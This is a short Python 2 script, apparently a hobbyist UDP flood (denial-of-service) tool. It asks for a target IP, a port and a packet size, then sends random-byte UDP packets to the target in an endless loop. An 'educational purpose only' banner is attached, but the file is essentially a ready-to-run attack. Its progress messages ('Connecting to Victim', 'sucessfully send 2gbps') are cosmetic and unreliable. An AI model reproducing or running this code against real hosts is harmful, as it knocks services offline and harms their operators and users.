import sys
import os
import random
import socket
import time
from sys import platform

os.system("color 9")

########################################
########################################
# Educational purpose only             #
########################################
# I'm not responsible for your actions #
########################################
########################################


if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print "This Script Works Best on Kali linux"
elif platform == "win32":
    os.system("cls")
else:
    print "\033[1;34m [-]Unknown System Detected \033[1;m"

print "\033[1;32m"

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print """
=======================================
     Made By : XXVY BEST TOOL
=======================================
Only for Educational purpose 
You need 18+ years old
=======================================
"""
try:
    size = input("bytes:  ")
    attack = random._urandom(size)
    turbo = "1"
    socks = "2"
    ip = raw_input("IP:  ")
    port = input("port:  ")
    method = input("------------\n1)Turbo\nSocks\n------------ \nMethod: ")
    print " "
    print "Using Socks"
    print "Connecting to Host"
    time.sleep(1)
    print "Connecting to Database"
    time.sleep(1)
    print "Connecting to Victim"
    time.sleep(1)
    print "Launching DDOSGAY"
    print " "
except SyntaxError:
    print " "
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    print " "
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    print " "
    exit("\033[1;34m [-]Canceled By User \033[1;m")
except ImportError:
    print " "
    exit("\033[1;34m [-]Install python 2.7.15")


while True:
    try:
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        connect.sendto(attack, (ip, port))
        print "sucessfully send 2gbps ===>"

    except KeyboardInterrupt:
        print " "
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except ImportError:
        print " "
        exit("\033[1;34m [-]Install python 2.7.15")


